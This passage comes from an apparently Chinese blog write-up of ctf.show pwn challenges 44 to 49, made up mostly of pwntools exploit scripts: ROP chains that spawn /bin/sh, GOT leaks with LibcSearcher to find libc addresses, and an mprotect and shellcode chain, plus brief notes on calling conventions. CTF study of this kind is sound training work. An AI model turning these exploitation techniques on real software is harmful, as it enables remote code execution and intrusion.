</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x08048409</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6C</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn44">pwn44
</h2><p>补充下32位和64位调用规定</p>
<p>32位：参数通过栈传递，p32(system)后需要跟参数地址</p>
<p>64位：前6个参数通过寄存器传递，如rdi，rsi等</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span><span class="mi">28242</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">\<span class="c1">#io = process(&#34;./pwn44&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;pwn3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gets</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;gets&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x4007f3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">buf2</span><span class="o">=</span><span class="mh">0x602080</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn45">pwn45
</h2><p>没有system，也没有“bin/sh”</p>
<ul>
<li>
<p>泄露write函数地址获取 libc 版本</p>
</li>
<li>
<p>获取 system 地址与 /bin/sh 的地址</p>
</li>
<li>
<p>再次执行源程序</p>
</li>
<li>
<p>触发栈溢出执行 system(‘/bin/sh’)</p>
</li>
</ul>
<p><img src="/p/ctfshow-pwn/image-20250310232614256.png"
	width="1270"
	height="343"
	srcset="/p/ctfshow-pwn/image-20250310232614256_hu_54b9be5bbbc257ed.png 480w, /p/ctfshow-pwn/image-20250310232614256_hu_d97b040eeba0fb2b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="370"
		data-flex-basis="888px"
	
></p>
<p>（可以利用puts函数）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28149</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl"><span class="c1">#write在got表的地址</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">write</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn47">pwn47
</h2><p><img src="/p/ctfshow-pwn/image-20250312133853059.png"
	width="939"
	height="535"
	srcset="/p/ctfshow-pwn/image-20250312133853059_hu_51ec2a6e7d622fd4.png 480w, /p/ctfshow-pwn/image-20250312133853059_hu_2cbbee5f4234a91e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="421px"
	
></p>
<p>一看直接打印地址，手动写自动脚本都行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 设置目标程序</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 本地调试或远程连接</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./vulnerable_binary&#39;)  # 本地</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28266</span><span class="p">)</span>  <span class="c1"># 远程</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;puts: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="n">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x0804B028</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span> <span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x9C</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn48">pwn48
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28103</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;O.o?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span><span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>总算明白了payloa的区别了</p>
<p>payload =  cyclic(0x9C+4)+p32(puts_plt)+p32(0)+p32(puts_got)+p32(4)</p>
<p>返回地址0，令程序崩溃，泄露puts地址后程序崩溃</p>
<p>payload =  cyclic(0x9C+4)+p32(puts_plt)+p32(main)+p32(puts_got)</p>
<p>返回main函数，程序继续运行</p>
<h2 id="pwn49">pwn49
</h2><p>mprotect函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28263</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn49&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mprotect</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">=</span><span class="mh">0x0806BEE0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_ebx_esi_ebp_ret</span> <span class="o">=</span><span class="mh">0x080a019b</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">addr</span><span class="o">=</span><span class="mh">0x080DA000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">size</span><span class="o">=</span><span class="mh">0x2000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">proc</span><span class="o">=</span><span class="mh">0x7</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mprotect</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">read</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="c1">#用于生成一个执行/bin/sh</span>
